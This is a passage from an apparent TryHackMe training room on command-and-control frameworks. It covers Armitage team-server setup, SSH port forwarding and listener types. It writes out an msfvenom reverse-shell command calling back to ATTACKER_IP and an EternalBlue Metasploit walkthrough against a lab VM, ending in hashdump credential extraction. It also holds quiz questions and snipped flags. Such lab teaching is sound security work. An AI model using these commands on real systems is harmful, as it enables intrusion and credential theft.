        </pre><p>After initialization is completed, we can finally start the Armitage Team Server.&nbsp;</p><h3>Starting and Connecting to Armitage</h3><p>

</p><div><div class="terminal-container"><span style="font-weight:normal">
    </span><div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold">
            Starting Armitage's Team Server</div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> /opt/armitage/release/unix <span class="token operator">&amp;&amp;</span> ./teamserver YourIP P@ssw0rd123</span></span>
<span class="token output">[*] Generating X509 certificate and keystore (for SSL)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Starting RPC daemon
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...
[*] MSGRPC backgrounding at 2022-02-06 17:47:08 -0500...
[*] MSGRPC background PID 2083
[*] sleeping for 20s (to let msfrpcd initialize)
[*] Starting Armitage team server
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Use the following connection details to connect your clients:
        Host: 127.0.0.2
        Port: 55553
        User: msf
        Pass: P@ssw0rd123

[*] Fingerprint (check for this string when you connect):
        d211e51c8886113433f63b588fd5ccfc9e323059
[+] hacking is such a lonely thing, until now
</span></code>
        </pre>

Once your Teamserver is up and running, we can now start the Armitage client. This is used to connect to the Teamserver and displays the GUI to the user.

<p></p><div><div class="terminal-container"><span style="font-weight:normal">
    </span><div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold">
            Starting Armitage</div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> /opt/armitage/release/unix <span class="token operator">&amp;&amp;</span> ./armitage</span></span>
<span class="token output">[*] Used the incumbent: 10.10.69.193
[*] Starting Cortana on 10.10.69.193
[*] Starting Cortana on 10.10.69.193
[*] Creating a default reverse handler... 0.0.0.0:8836

</span></code>
        </pre>

<p style="font-weight:bold"><br></p><p><span>When operating a <a class="emmQEd6C glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;emmQEd6C&#39;)">C2</a> Framework, you never want to expose the management interface publicly; You should always listen on a local interface, never a public-facing one. This complicates access for fellow operators. Fortunately, there is an easy solution for this. For operators to gain access to the server, you should create a new user account for them and enable SSH access on the server, and they will be able to SSH port forward TCP/55553.&nbsp; Armitage </span><b>explicitly denies</b> users listening on 127.0.0.1; this is because it is essentially a shared Metasploit server with a "Deconfliction Server" that when multiple users are connecting to the server, you're not seeing everything that your other users are seeing. With Armitage, you must listen on your tun0/eth0 IP Address.</p><p style="font-weight:bold;text-align:center"><img src="./TryHackMe _ Intro to C2_files/250523e0ea93b10e42c3515c6b812609.png"><br></p><p style="text-align:center"><i>Modify the Host IP Address to whatever you set in the previous step, "Starting Armitage's Team Server".</i></p><p style="text-align:left">After clicking "Connect", you will be prompted to enter a nickname. You can set this to whatever you like; only your fellow Red Team Operators will see it.</p><p style="font-weight:bold;text-align:center"><img src="./TryHackMe _ Intro to C2_files/67465eb4ae28c1f7d57452b6b632314c.png"></p><p style="text-align:center"><i>Armitage's UI to put in a custom nickname</i></p><p style="text-align:left">After a moment or two, the Armitage UI should open up, until we start interacting with remote systems; it will look bare. In the next upcoming task, we will be exploiting a vulnerable virtual machine to get you more accustomed to the Armitage UI and how it can be used.</p><p style="font-weight:bold;text-align:center"><img src="./TryHackMe _ Intro to C2_files/fca62d124845af393a71e38e9eb94edb.png" style="width:1050px;height:510.455px"></p><p style="text-align:center"><i>The Armitage UI</i></p><p style="text-align:left">Now that Armitage is set up and working correctly, in the next task, we will learn more about securely accessing Armitage (as described above), creating listeners, various listener types, generating payloads, and much more!</p></div></div>
</div></div></div></div></div></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the task, set up Armitage, and explore the User Interface.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse5" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 5                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> C2 Operation Basics
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p></p><h3><span>﻿Accessing and Managing your <a class="OC0TzLCn glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;OC0TzLCn&#39;)">C2</a> Infrastructure</span></h3><div><span>Now that we have a general idea of how to set up a <a class="txmjcHer glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;txmjcHer&#39;)">C2</a> Server, we will go over some basic operational details that you should know when accessing your C2 Server. It's important to note that you are </span><b>not </b>required to perform any actions in this task - This is meant to gain general experience and familiarity with Command and Control Frameworks.</div><div><br></div><div><span style="font-weight:bolder">Basic Operational Security</span></div><div><span>We briefly touched on this in the last section; You should never have your <a class="P9ahJ1yk glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;P9ahJ1yk&#39;)">C2</a> management interface directly accessible. This is primarily for you to improve operational security. It can be incredibly easy to fingerprint C2 servers. For example, in versions prior to 3.13, Cobalt Strike C2 servers were able to be identified by an extra space (\x20) at the end of the HTTP Response. Using this tactic, many Blue Teamers could fingerprint all of the Cobalt Strike C2 servers publicly accessible. For more information on fingerprinting and identifying Cobalt Strike C2 Servers, check out this posted on the </span><a href="https://www.recordedfuture.com/cobalt-strike-servers/" target="_blank">Recorded Future blog</a>.</div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/e81ca61b06e861e6f3a4f58660cc2e76.png"><img><br></div><div style="text-align:center"><i><span>Screenshot from a Hex Editor depicting the extra space at the end of an <a class="Uy2fgSBs glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Uy2fgSBs&#39;)">HTTP</a> Response</span></i></div><div><br></div><div><span>The point in mentioning this is that you want to reduce your operational security risk as much as possible. If this means not having the management interface for your <a class="p1id8ywo glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;p1id8ywo&#39;)">C2</a> server publicly accessible, then, by all means, you should do it.</span></div><div><br></div><div><span style="font-weight:bolder"><span>Accessing your Remote <a class="qz09t0d9 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;qz09t0d9&#39;)">C2</a> Server that's Listening Locally</span></span></div><div><span>This section will be focusing on how to securely access your <a class="7rPy2KNV glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;7rPy2KNV&#39;)">C2</a> server by SSH port-forwarding; if you have port-forwarded with SSH before, feel free to skip over this section, you may not learn anything new. For those unfamiliar, SSH port-forwarding allows us to either host resources on a remote machine by forwarding a local port to the remote server, or allows us to access local resources on the remote machine we are connecting to.&nbsp; In some circumstances, this may be for circumventing Firewalls.</span></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/bc96eabae5235e893e22417d2cc2301f.png"></div><div style="text-align:center"><i>Firewall Blocks TCP/8080</i></div><div style="text-align:center"><i><br></i></div><div>Or, in our instance, this could be done for operational security reasons.</div><div style="text-align:center"><i><br></i></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/7edda600836d41987311316908354439.png"><i><br></i></div><div style="text-align:center"><i>Firewall Allows TCP/22, allowing us to access TCP/8080 over TCP/22</i></div><div><br></div><div>Now that we have a better understanding of why we want to SSH port forward, let's go over the how.</div><div><span>In our <a class="7kYcWRso glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;7kYcWRso&#39;)">C2</a> set up from Task 4, our Teamserver is listening on localhost on TCP/55553. In order to access Remote port 55553, we must set up a Local port-forward to forward our local port to the remote Teamserver server. We can do this with the -L flag on our SSH client:</span></div><div><br></div><div class="terminal-content"><div class="terminal-top">SSH Port Forward</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">ssh</span> -L <span class="token number">55553</span>:127.0.0.1:55553 root@192.168.0.44</span></span>
<span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Connected"</span> </span></span>
<span class="token output">Connected</span></code>
</pre><pre class="terminal-code" style="font-size:14px"><span style="font-family:Ubuntu, monospace;font-size:16px;white-space:normal"><span>Now that we have an SSH remote port forward set up, you can now connect to your <a class="vJC6sh2z glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;vJC6sh2z&#39;)">C2</a> server running on TCP/55553. As a reminder, Armitage does </span><b>not </b>support listening on a loopback interface (127.0.0.1-127.255.255.255), so this is&nbsp;<span style="font-weight:bolder">general</span><span>&nbsp;<a class="41oCvjZB glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;41oCvjZB&#39;)">C2</a> server admin advice. You will find this advice more centric to C2 servers like Covenant, Empire, and many others.</span></span></pre><span>We highly recommend putting firewall rules in place for <a class="KMDYfSa0 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;KMDYfSa0&#39;)">C2</a> servers that must listen on a public interface</span><span style="font-size:16px;font-family:Ubuntu;white-space:normal"><span>&nbsp;so only the intended users can access your <a class="aFusu73u glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;aFusu73u&#39;)">C2</a> server. There are various ways to do this. If you are hosting Cloud infrastructure, you can set up a Security Group or use a host-based firewall solution like UFW or IPTables.</span></span></div><div class="terminal-content"><span style="font-size:16px;font-family:Ubuntu;white-space:normal"><br></span><pre class="terminal-code" style="font-size:14px"><span style="font-family:Ubuntu, monospace;font-size:16px;white-space:normal"><span style="font-weight:bolder">Creating a Listener in Armitage</span></span></pre><span style="font-family:Ubuntu"><span>Next, we're going to move onto a topic that all <a class="H3OJlIWg glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;H3OJlIWg&#39;)">C2</a> servers have - this being listener creation. To stay on topic, we will demonstrate how to set up a basic listener with Armitage then explore some of the other theoretical listeners you may encounter in various other C2 Frameworks.&nbsp;</span></span><span style="font-size:16px;white-space:normal"><span style="font-family:Ubuntu">Let's create a basic Meterpreter Listener running on TCP/31337. To start, click on the Armitage dropdown and go over to the "Listeners" section; you should see three options, Bind, Reverse, and set LHOST. Bind refers to Bind Shells; you must connect to these hosts. Reverse refers to standard Reverse Shells; this is the option we will be using.</span><br></span><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/1ad92c6b503433e43a906c0d6719f137.png"><span style="font-size:16px;white-space:normal"><br></span></div><div style="text-align:center"><span style="font-size:16px;white-space:normal"><i>Creating a Listener in Armitage</i></span></div><div style="text-align:center"><span style="font-size:16px;white-space:normal"><br></span></div><div><span style="font-size:16px;white-space:normal">After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. There are two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.</span></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/f1799890a05592fcc5338efd4edf281b.png"><span style="font-size:16px;white-space:normal"><br></span></div><div style="text-align:center"><span style="font-size:16px;white-space:normal"><i>Configuring the Listener</i></span></div><div style="text-align:center"><span style="font-size:16px;white-space:normal"><br></span></div><div><span style="font-size:16px;white-space:normal">After pressing enter, a new pane will open up, confirming that your listener has been created. This should look like the standard Metasploit exploit/multi/handler module.</span></div><div><span style="font-size:16px;white-space:normal"><br></span></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/7bc806ea13495e55eb82fc5c399d8876.png"><span style="font-size:16px;white-space:normal"><br></span></div><div style="text-align:center"><span style="font-size:16px;white-space:normal"><i>Listener successfully configured</i></span></div><div style="text-align:center"><span style="font-size:16px;white-space:normal"><br></span></div><div>After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receive&nbsp;callbacks to our Armitage server.&nbsp;</div><div><br></div><div><b>Getting a Callback</b></div><div><span style="font-size:16px;white-space:normal"><br></span></div></div>

<div class="terminal-content"><div class="terminal-top">MSFVenom Payload Generation</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">31337</span> -f exe -o shell.exe</span></span>
<span class="token output">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
</span></code>
</pre></div>After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. After a moment or two, you should receive a callback from the machine.<p></p><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/1dcc8962d5a595690a9b5ea9c4888dad.png" style="width:960.569px;height:450.441px"><br></p><p style="text-align:center"><i>Callback from the Victim</i></p><p style="text-align:left"><span style="font-size:28px">Listener Type</span></p><p style="text-align:left">As previously mentioned, standard reverse shell listeners are not the only ones that exist; there are many varieties that use many different protocols; however, there are a few common ones that we will cover, these being the following:</p><p style="text-align:left"><b>Standard Listener -&nbsp;</b></p><p style="text-align:left"><span>These often communicate directly over a raw <a class="zi84tUgm glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;zi84tUgm&#39;)">TCP</a> or UDP socket, sending commands in cleartext. Metasploit has full support for generic listeners.</span></p><p style="text-align:left"><b>HTTP/HTTPS Listeners -&nbsp;</b></p><p style="text-align:left"><span>These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable <a class="9sOm7eoP glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;9sOm7eoP&#39;)">C2</a> profiles to mask a C2 server. When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW. Metasploit has full support for HTTP/HTTPS listeners.</span></p><p style="text-align:left"><b><span><a class="V8vzUv8R glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;V8vzUv8R&#39;)">DNS</a> Listener -</span></b></p><p style="text-align:left"><span><a class="gjgAPWX0 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;gjgAPWX0&#39;)">DNS</a> Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. For more information, see this "</span><a href="https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf" target="_blank">Meterpreter over DNS</a>" presentation by Alexey Sintsov and Maxim Andreyanov. These are often very useful for bypassing Network Proxies.</p><p style="text-align:left"><b><span><a class="p7ElrFEh glossary-term" onclick="initPopOver(&#39;SMB&#39;, &#39;p7ElrFEh&#39;)">SMB</a> Listener -&nbsp;</span></b></p><p style="text-align:left"><span>Communicating via <a class="2Dzfzbun glossary-term" onclick="initPopOver(&#39;SMB&#39;, &#39;2Dzfzbun&#39;)">SMB</a> named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. Metasploit has support for Named Pipes.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Which listener should you choose if you have a device that cannot easily access the internet?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Which listener should you choose if you're accessing a restricted network segment?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Which listener should you choose if you are dealing with a Firewall that does protocol inspection?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *****" value="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 6                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Command, Control, and Conquer 
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="620f5a7c3d1adc005601b677" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <h3>Sample Exploit</h3><div><b>Host Enumeration with Armitage</b></div><div>Before letting you go off on your own, we're going to demonstrate how to exploit a sample Virtual Machine. First, we will execute a port scan within Armitage by going to the "Hosts" section, hovering over "Nmap Scan", and selecting "Quick Scan".</div><div><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/6306202489d3cfdb126cd940ebb90896.png"><br></div><div style="text-align:center"><i>Armitage submenu of Hosts -&gt; Nmap Scan -&gt; Quick Scan</i></div><div><br></div><div>After selecting "Quick scan", a new option will pop up; this will prompt you to enter the IP Address range you would like to scan. You should enter the IP Address of the deployed Virtual machine in this box.</div><div><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/1a12f245a88dbf0985a127e97e8a9734.png"><br></div><div style="text-align:center"><i>Input menu of "Enter Scan Range" with the IP Address VICTIM_MACHINE</i></div><div style="text-align:left"><br></div><div style="text-align:left">After pressing "Ok", and waiting a moment or two, you should see a new tab open up called "nmap" and a new machine display in the "Workspace" window. In the "nmap" tab, you will see the raw scan results.</div><div style="text-align:left"><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/ef05d79307bdcf6326751ee531daa538.png" style="width:953.251px;height:460.167px"><br></div><div style="text-align:center"><i>Results from the Nmap port-scan</i></div><div style="text-align:left"><br></div><div style="text-align:left">Now that you have learned how to execute a basic port scan, try to execute various other scans against the target and see what additional information you may retrieve from a host.</div><div style="text-align:left"><i><span>Hint: A Comprehensive Scan will grab banners, enumerate software versions, enumerate <a class="UGYvDwz1 glossary-term" onclick="initPopOver(&#39;OS&#39;, &#39;UGYvDwz1&#39;)">OS</a> versions, and much more!</span></i><br></div><div style="text-align:left"><i><br></i></div><div style="text-align:left"><b>Exploitation with Armitage</b></div><div style="text-align:left">Next up, we're going to show off exploitation with Armitage; our victim in our example is a Windows 7 machine (more specifically, Blue). This machine is vulnerable to the classic exploit "Eternal&nbsp; Blue".&nbsp; To find this, we will focus on the far right tab with folders, we will expand the "Exploit" dropdown, then find the "Windows" dropdown, then the "SMB" dropdown, then you will see all of the exploits.</div><div style="text-align:left"><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/0e382aaec1230fd7582b4d1ef2e5a5fb.png"><br></div><div style="text-align:center"><i>Listing all the exploits within Armitage</i></div><div style="text-align:left"><br></div><div style="text-align:left">Next up, you can double click your exploit of choice, or drag and drop the exploit onto the host, and a new window will open up. Clicking "launch" will fire off the exploit.&nbsp;</div><div style="text-align:left"><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/5db55dc8c10ed0048e6aa62f2291d260.png" style="width:827.441px;height:544.667px"><br></div><div style="text-align:center"></div><div style="text-align:center"><i>Eternal Blue Exploit&nbsp; Module Information</i></div><div style="text-align:center"><i><br></i></div><div style="text-align:left">After clicking "Launch", you will notice a new "Exploit" tab open up. Armitage will run all of the regular checks that Metasploit normally does. In the case of Eternal Blue, it ran the standard check script followed by the exploit script until it got a successful shell. It's worth noting that by default in this Exploit, it chose a Bind shell. Make sure you fully read the exploit information and options to see if a Bind Shell or a Reverse Shell is an option.</div><div style="text-align:left"><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/d26c03ba17e96c1e5ca70ca8a7b76260.png" style="width:1047.67px;height:509.101px"></div><div style="text-align:center"><i>A Successful Exploitation Attempt from Armitage</i></div><div style="text-align:left"><br></div><div style="text-align:left">After you receive your shell, right-click on the host and select "Interact". This will open a standard shell you're familiar with. In order to get a Meterpreter shell, we recommend that you run the multi/manage/shell_to_meterpreter module.</div><div style="text-align:left"><br></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/b08eff73b568e5d4ccc8d4be6a915b88.png" style="width:1030.67px;height:502.651px"></div><div style="text-align:center"><i>Compromised&nbsp;Host in Armitage</i></div><div style="text-align:center"><i><br></i></div><div style="text-align:left"><span style="font-size:1.75rem">Practice Time</span><br></div><div>Now that you have learned how to exploit hosts using Armitage, you will now get to practice your skills by hacking the virtual machine by using Metasploit and Armitage. There are multiple exploit paths that you may be able to follow. We encourage you to explore the various exploit paths you may be able to find in order to gain a better understanding of exploitation and post-exploitation modules in Metasploit and Armitage. As a reminder, Armitage is just Metasploit with a GUI; all the same exploits exist and are categorized the same way.</div><div><br></div><div><div>

<details>
<summary><span style="font-size:1.75rem">Need Some Help? Click here!</span>
</summary><span>
If you are having difficulties with compromising the machine, here's a step-by-step guide to compromise the VM with Metasploit. If you would like to use Armitage, use this&nbsp;</span><a href="https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing" target="_blank">guide that shows step-by-step </a>instructions. Now onto Metasploit!<br><br>Our first step is to launch Metasploit:<br>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Launching Metasploit and using Eternal Blue!
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@attackbox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfconsole -q</span></span>
<span class="token output"><span>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST eth0
LHOST =&gt; eth0
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST VICTIM_IP
RHOST =&gt; VICTIM_IP
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run

[*] Started reverse TCP handler on ATTACKER_IP:4444 
[*] VICTIM_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] VICTIM_IP:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] VICTIM_IP:445      - Scanned 1 of 1 hosts (100% complete)
[*] VICTIM_IP:445 - Connecting to target for exploitation.
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</span></span></code>
        </pre>
    </div>
</div>

Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the users NTLM hashes:<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Running Hashdump
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d&lt;snip!&gt;4d6e0943c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae93&lt;snip!&gt;d7e0c089c0:::
Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867&lt;snip!&gt;5c1309a5c:::
meterpreter &gt; 
</span></code>
        </pre>
    </div>
</div>

All that is left is to now retrieve the flags in the user's Home folders:
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Collecting our flags!
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session">
<span class="token output">meterpreter &gt; cat C:/Users/Administrator/Desktop/root.txt
THM{bd6ea6c87&lt;snip!&gt;21081132744}
meterpreter &gt; cat C:/Users/Ted/Desktop/user.txt
THM{217fa45e3&lt;snip!&gt;fc0be28e760} 
</span></code>
        </pre>
    </div>
</div>
And that's all there is to it! You have successfully compromised Ted's PC.
</details></div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the Administrator's NTLM hash?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********************************" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag can be found after gaining Administrative access to the PC?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************************}" value="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What flag can be found after gaining access to Ted's user account?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************************}" value="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is Ted's NTLM Hash?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********************************" value="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
